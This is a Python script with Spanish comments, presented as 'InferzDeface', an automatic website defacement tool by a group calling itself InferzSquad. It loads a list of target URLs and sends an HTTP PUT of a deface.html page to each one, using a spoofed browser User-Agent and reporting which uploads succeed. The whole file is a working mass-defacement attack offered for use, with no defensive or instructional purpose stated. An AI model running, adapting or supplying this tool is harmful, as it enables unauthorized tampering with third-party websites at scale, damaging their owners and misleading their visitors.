import os
import chardet
import requests
import logging
from typing import List, Dict
from colorama import Fore, Style, init

# aquí inicias colorama :v
init(autoreset=True)

# ================================================
# aquí configuras logging
# ================================================

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[logging.FileHandler("uploader.log"), logging.StreamHandler()],
)

# ================================================
# Aquí están las variables
# ================================================

# Ruta del script actual
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

# Archivos predeterminados
TARGETS_FILE = os.path.join(SCRIPT_DIR, "targets.txt")  # targets.txt en la misma carpeta
UPLOAD_FILE = os.path.join(SCRIPT_DIR, "deface.html")   # deface.html en la misma carpeta
targets = []

# ================================================
# Aquí están las funciones
# ================================================

def detect_encoding(file_path: str) -> str:
    """Detecta la codificación de un archivo"""
    with open(file_path, "rb") as file:
        result = chardet.detect(file.read())
        return result["encoding"] or "utf-8"

def read_file(file_path: str) -> str:
    """Lee el contenido de un archivo, manejando múltiples codificaciones"""
    try:
        with open(file_path, "r", encoding="utf-8") as file:
            return file.read()
    except UnicodeDecodeError:
        encoding = detect_encoding(file_path)
        with open(file_path, "r", encoding=encoding) as file:
            return file.read()

def load_targets(file_path: str) -> List[str]:
    """Carga los targets desde un archivo"""
    if not os.path.exists(file_path):
        raise FileNotFoundError(f"El archivo {file_path} no existe.")

    content = read_file(file_path)
    targets = [line.strip() for line in content.splitlines() if line.strip()]
    if not targets:
        raise ValueError("El archivo de targets está vacío.")
    return targets

def validate_file(file_path: str, expected_extension: str = None) -> None:
    """Valida que un archivo exista y tenga la extensión correcta"""
    if not os.path.exists(file_path):
        raise FileNotFoundError(f"El archivo {file_path} no existe.")
    if expected_extension and not file_path.endswith(expected_extension):
        raise ValueError(f"El archivo debe tener una extensión {expected_extension}.")

# ================================================
# Aquí está la funcionalidad principal del script
# ================================================

def upload_file_to_website(url: str, file_path: str) -> Dict[str, str]:
    """Sube el archivo html a un sitio web usando HTTP PUT"""
    try:
        with open(file_path, "rb") as file:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
            }
            response = requests.put(url, data=file, headers=headers, timeout=10)
            if 200 <= response.status_code < 300:
                return {"status": "success", "message": f"Archivo subido a {url}"}
            else:
                return {
                    "status": "error",
                    "message": f"Error al subir a {url}. Código de estado: {response.status_code}",
                }
    except requests.exceptions.RequestException as e:
        return {"status": "error", "message": str(e)}

def process_targets(targets: List[str], file_path: str):
    """Procesa cada objetivo e intenta subir el archivo"""
    for target in targets:
        if not target.startswith("http://") and not target.startswith("https://"):
            target = "http://" + target
        result = upload_file_to_website(target, file_path)
        if result["status"] == "success":
            print(Fore.GREEN + f"[SUCCESS] {result['message']}")
        else:
            print(Fore.RED + f"[ERROR] {result['message']}")

# ================================================
# Aquí está el menú
# ================================================

def print_menu():
    """Muestra el menú"""
    print(Fore.CYAN + "==============================================")
    print(Fore.YELLOW + "          InferzDeface | Automatic Deface Tool")
    print(Fore.CYAN + "==============================================")
    print(Fore.GREEN + "1. Cargar targets.txt")
    print(Fore.GREEN + "2. Iniciar Deface")
    print(Fore.RED + "3. Salir")
    print(Fore.CYAN + "==============================================")
    print(Fore.MAGENTA + "by InferzSquad | kennyig ")
    print(Fore.CYAN + "==============================================")

def main_menu():
    """Maneja el menú"""
    global targets

    while True:
        print_menu()
        choice = input(Fore.YELLOW + "Seleccione una opción: " + Style.RESET_ALL)

        if choice == "1":
            try:
                targets = load_targets(TARGETS_FILE)
                print(Fore.GREEN + f"{len(targets)} targets cargados correctamente.")
            except Exception as e:
                print(Fore.RED + f"Error: {e}")

        elif choice == "2":
            if not targets:
                print(Fore.RED + "Primero cargue los targets")
            else:
                try:
                    validate_file(UPLOAD_FILE, expected_extension=".html")
                    print(Fore.CYAN + "==============================================")
                    print(Fore.YELLOW + "               RESULTADOS DE LA SUBIDA")
                    print(Fore.CYAN + "==============================================")
                    process_targets(targets, UPLOAD_FILE)
                except Exception as e:
                    print(Fore.RED + f"Error: {e}")

        elif choice == "3":
            print(Fore.YELLOW + "¡Hasta luego!")
            break

        else:
            print(Fore.RED + "Opción no válida. Intente de nuevo.")

# ================================================
# el start point :v
# ================================================

if __name__ == "__main__":
    main_menu()